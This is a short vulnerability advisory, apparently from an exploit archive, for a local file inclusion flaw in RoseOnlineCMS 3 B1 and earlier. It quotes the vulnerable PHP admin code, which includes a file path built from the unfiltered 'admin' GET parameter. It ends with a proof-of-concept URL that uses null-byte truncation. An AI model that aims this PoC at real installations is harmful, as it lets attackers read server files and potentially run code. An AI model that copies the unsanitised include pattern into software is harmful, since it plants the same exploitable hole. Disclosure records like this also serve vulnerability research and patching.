@@ -1,0 +1,38 @@
+                            \#'#/
+                            (-.-)
+   --------------------oOO---(_)---OOo-------------------
+   | RoseOnlineCMS <= 3 B1 (admin) Local File Inclusion |
+   |      (works only with magic_quotes_gpc = off)      |
+   ------------------------------------------------------
+[!] Discovered: cr4wl3r <cr4wl3r[!]linuxmail.org>
+[!] Download: http://sourceforge.net/projects/rosecms/files/
+[!] Date: 30.12.2009
+[!] Remote: yes
+
+[!] Code :
+
+<?PHP 
+if (isset($_GET['write'])) {
+	$argv = explode('-',$_GET['write']);
+	settype($argv,'array'); 
+	$_GET['admin'] = @$argv[0];
+	$_GET['url'] = @$argv[1];
+	$_GET['do'] = @$argv[2];
+	$_GET['key'] = @$argv[3];
+}
+$admin = !isset($_GET['admin']) ? index : $_GET['admin'] ;
+
+   if (is_file("modules/admin/".$admin.".php")) {
+   		include("modules/admin/".$admin.".php");
+	
+   } else {	
+		echo('Administrator page not found.
+					<br><br> <a href=index.php>Click here to go back home</a>'); 
+   }
+
+ob_end_flush();
+?>
+
+[!] PoC:
+
+    [RoseOnlineCMS_path]/modules/admincp.php?admin=[LFI%00]
